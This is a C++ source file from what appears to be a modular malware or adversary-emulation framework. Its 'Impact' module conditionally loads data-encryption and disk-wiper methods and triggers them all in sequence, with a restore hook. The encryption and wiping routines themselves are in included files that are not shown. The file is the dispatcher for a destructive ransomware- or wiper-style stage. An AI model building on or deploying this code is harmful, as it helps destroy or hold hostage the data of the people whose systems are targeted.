#include "modules/Impact.hpp"
#include "utils/Logger.hpp"

#ifdef METHOD_ENCRYPT
    #include "modules/impact/Encryption.cpp"
    #include "modules/impact/Encryption.hpp"
#endif
#ifdef METHOD_WIPE
    #include "modules/impact/Wiper.hpp"
#endif

Impact::Impact() {
    #ifdef METHOD_ENCRYPT
    methods.push_back(std::make_unique<EncryptionMethod>());
    #endif
    
    #ifdef METHOD_WIPE
    methods.push_back(std::make_unique<WiperMethod>());
    #endif
}

bool Impact::execute(const std::string& args) {
    LOG_INFO("Executing impact")
    if (methods.empty()) {
        LOG_ERROR("No impact methods available")
        return false;
    }

    for (auto& method : methods) {
        LOG_INFO("Triggering: {}", method->getName())
        method->trigger();
    }

    return true;
}

void Impact::restore() {
    for (auto& method : methods) {
        method->restore();
    }
}